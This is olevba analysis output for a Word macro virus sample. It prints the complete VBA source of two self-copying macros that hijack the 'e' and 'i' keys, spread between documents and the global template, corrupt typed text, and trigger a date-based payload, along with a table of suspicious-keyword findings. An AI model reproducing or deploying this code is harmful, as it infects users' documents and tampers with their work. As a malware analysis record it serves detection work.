olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO XxGRUNTxX2.bas 
in file: Virus.MSWord.Nj-wmdlk1.c - OLE stream: 'Macros/VBA/XxGRUNTxX2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim VM1$
Dim VM2$
Dim NJ$
Dim F$
Dim A$
On Error GoTo -1: On Error GoTo Finish

WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:="XxGRUNTxX1", Add:=1, Context:=0
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:="XxGRUNTxX1", Add:=1, Context:=1
WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="XxGRUNTxX2", Add:=1, Context:=0
WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="XxGRUNTxX2", Add:=1, Context:=1

VM1$ = WordBasic.[WindowName$]() + ":XxGRUNTxX1"
VM2$ = WordBasic.[WindowName$]() + ":XxGRUNTxX2"

NJ$ = WordBasic.[MacroFileName$]("XxGRUNTxX1")
F$ = WordBasic.[FileNameInfo$](NJ$, 5)

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy VM1$, "Global:XxGRUNTxX1", 1
    WordBasic.MacroCopy VM2$, "Global:XxGRUNTxX2", 1
    WordBasic.FileSaveAll 1, 1
End If

Finish:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finito
Else
    WordBasic.Insert "i"
End If

Finito:
If WordBasic.Month(WordBasic.Now()) = 5 And WordBasic.Day(WordBasic.Now()) = 9 Then
    WordBasic.Call "Payload"
Else
    GoTo EndOne
End If

EndOne:
End Sub

Private Function VInstalled()
Dim i
    VInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "XxGRUNTxX1" Then
                VInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO XxGRUNTxX1.bas 
in file: Virus.MSWord.Nj-wmdlk1.c - OLE stream: 'Macros/VBA/XxGRUNTxX1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim VM1$
Dim VM2$
Dim A$
On Error GoTo -1: On Error GoTo Finish

WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:="XxGRUNTxX1", Add:=1, Context:=0
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:="XxGRUNTxX1", Add:=1, Context:=1
WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="XxGRUNTxX2", Add:=1, Context:=0
WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="XxGRUNTxX2", Add:=1, Context:=1

VM1$ = WordBasic.[WindowName$]() + ":XxGRUNTxX1"
VM2$ = WordBasic.[WindowName$]() + ":XxGRUNTxX2"

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:XxGRUNTxX1", VM1$, 1
    WordBasic.MacroCopy "Global:XxGRUNTxX2", VM2$, 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finito
Else
    WordBasic.Insert "e"
End If

Finito:
If WordBasic.Month(WordBasic.Now()) = 5 And WordBasic.Day(WordBasic.Now()) = 9 Then
    Payload
Else
    GoTo EndOne
End If

EndOne:
End Sub

Private Function VInstalled()
Dim i
    VInstalled = 0
    If WordBasic.CountMacros(1) > 0 Then
        For i = 1 To WordBasic.CountMacros(1)
            If WordBasic.[MacroName$](i, 1) = "XxGRUNTxX1" Then
                VInstalled = 1
            End If
        Next i
    End If
End Function

Private Sub Payload()

Rem A Virus from Nightmare Joker's Demolition Kit!


End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

